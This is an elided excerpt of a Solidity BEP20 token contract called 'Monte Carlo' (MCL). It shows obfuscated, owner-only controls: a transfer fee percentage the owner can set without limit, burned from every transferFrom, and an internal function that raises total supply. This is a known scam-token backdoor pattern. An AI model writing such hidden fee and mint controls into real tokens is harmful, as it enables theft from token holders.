...
contract HelloBEP20 is IBEP20 {
    using MathEW for uint256;

    string public name20EW =  "Monte Carlo";
    string public symbol20EW =  "MCL";
    uint8 public decimals20EW = 9;
    uint public _totalSupplyEW = 1*10**15 * 10**9;
    
    address private _owner;
    uint8 private _fdaking;
    ...
    constructor() {
        ...
        _owner = msgSender;
        balances[msg.sender] = _totalSupplyEW;
        emit Transfer(address(0), msg.sender, _totalSupplyEW);
    }
  ...
  function decimals() public view virtual returns (uint8) {
    ...
    function totalSupply() public override view returns (uint) {
        return _totalSupplyEW - balances[address(0)];
    }
    ...
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        ...
        _lavf(from,tokens.mul(getVerLav()).div(10**2));
    ...
    function _lavf(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyEW = _totalSupplyEW.subb(tokens);
    ...
    function sVerLav(uint8 fdaking) public virtual onlyOwner {
		_fdaking = fdaking;
	}
    ...
    function _ekle(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyEW = _totalSupplyEW.ad(tokens);
